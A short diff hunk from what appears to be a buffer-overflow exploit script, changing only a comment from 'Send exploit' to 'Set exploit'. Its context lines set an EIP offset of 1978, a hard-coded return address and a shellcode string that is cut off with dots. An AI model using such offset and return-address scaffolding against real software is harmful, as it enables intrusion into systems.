@@ -66,7 +66,7 @@ runner.setEipOffset(1978)
 eip_address = "\xaf\x11\x50\x62"
 runner.setEipAddress(eip_address)
 
-# Send exploit
+# Set exploit
 exploit = ("\xdb\xde.....")
 runner.setExploit(exploit)
 
